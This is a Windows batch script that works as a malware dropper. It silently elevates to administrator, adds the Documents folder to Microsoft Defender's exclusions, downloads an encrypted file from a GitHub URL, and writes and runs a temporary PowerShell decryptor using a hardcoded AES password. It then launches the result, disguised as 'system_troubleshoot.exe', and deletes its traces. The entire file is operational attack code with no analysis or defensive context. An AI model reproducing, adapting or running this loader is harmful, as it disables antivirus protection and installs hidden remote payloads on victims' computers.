@echo off

REM Check if the script is running with administrative privileges
NET SESSION >nul 2>nul
if %errorlevel% NEQ 0 (
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb RunAs" >nul 2>nul
    exit /b
)

REM Step 1: Add Documents folder to antivirus exclusion
powershell -Command "Add-MpPreference -ExclusionPath (Join-Path $env:USERPROFILE 'Documents')" >nul 2>nul

REM Step 2: Download the encrypted text file from the cloud to the Documents folder
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/spooffewfe/yff/refs/heads/main/encrypted-system-error.txt', (Join-Path $env:USERPROFILE 'Documents\encrypted-system-error.txt'))" >nul 2>nul

REM Step 3: Create a temporary PowerShell script to decrypt the file
echo function Decrypt-File { > "%TEMP%\decrypt_script.ps1" 2>nul
echo param ([string]$InputFile, [string]$OutputFile, [string]$Password) >> "%TEMP%\decrypt_script.ps1" 2>nul
echo $base64Data = [System.IO.File]::ReadAllText($InputFile) >> "%TEMP%\decrypt_script.ps1" 2>nul
echo $encryptedData = [Convert]::FromBase64String($base64Data) >> "%TEMP%\decrypt_script.ps1" 2>nul
echo $salt = $encryptedData[0..15] >> "%TEMP%\decrypt_script.ps1" 2>nul
echo $iv = $encryptedData[16..31] >> "%TEMP%\decrypt_script.ps1" 2>nul
echo $cipherText = $encryptedData[32..($encryptedData.Length - 1)] >> "%TEMP%\decrypt_script.ps1" 2>nul
echo $deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes $Password, $salt, 10000 >> "%TEMP%\decrypt_script.ps1" 2>nul
echo $key = $deriveBytes.GetBytes(32) >> "%TEMP%\decrypt_script.ps1" 2>nul
echo $aes = [System.Security.Cryptography.Aes]::Create() >> "%TEMP%\decrypt_script.ps1" 2>nul
echo $aes.Key = $key >> "%TEMP%\decrypt_script.ps1" 2>nul
echo $aes.IV = $iv >> "%TEMP%\decrypt_script.ps1" 2>nul
echo $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC >> "%TEMP%\decrypt_script.ps1" 2>nul
echo $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7 >> "%TEMP%\decrypt_script.ps1" 2>nul
echo $decryptor = $aes.CreateDecryptor() >> "%TEMP%\decrypt_script.ps1" 2>nul
echo $plainData = $decryptor.TransformFinalBlock($cipherText, 0, $cipherText.Length) >> "%TEMP%\decrypt_script.ps1" 2>nul
echo $maxRetries = 10 >> "%TEMP%\decrypt_script.ps1" 2>nul
echo $retryCount = 0 >> "%TEMP%\decrypt_script.ps1" 2>nul
echo while ($retryCount -lt $maxRetries) { >> "%TEMP%\decrypt_script.ps1" 2>nul
echo try { >> "%TEMP%\decrypt_script.ps1" 2>nul
echo     [System.IO.File]::WriteAllBytes($OutputFile, $plainData) >> "%TEMP%\decrypt_script.ps1" 2>nul
echo     break >> "%TEMP%\decrypt_script.ps1" 2>nul
echo } catch { >> "%TEMP%\decrypt_script.ps1" 2>nul
echo     $retryCount++ >> "%TEMP%\decrypt_script.ps1" 2>nul
echo     Start-Sleep -Seconds 2 >> "%TEMP%\decrypt_script.ps1" 2>nul
echo } >> "%TEMP%\decrypt_script.ps1" 2>nul
echo } >> "%TEMP%\decrypt_script.ps1" 2>nul
echo } >> "%TEMP%\decrypt_script.ps1" 2>nul
echo Decrypt-File -InputFile (Join-Path $env:USERPROFILE 'Documents\encrypted-system-error.txt') -OutputFile (Join-Path $env:USERPROFILE 'Documents\system_troubleshoot.exe') -Password 'IAMBERLIN' >> "%TEMP%\decrypt_script.ps1" 2>nul

REM Step 4: Run the PowerShell script to decrypt the file
powershell -ExecutionPolicy Bypass -File "%TEMP%\decrypt_script.ps1" >nul 2>nul

REM Step 5: Run the decrypted executable file
start "" "%USERPROFILE%\Documents\system_troubleshoot.exe" >nul 2>nul

REM Clean up temporary PowerShell script
del "%TEMP%\decrypt_script.ps1" >nul 2>nul

REM Silent completion
exit /b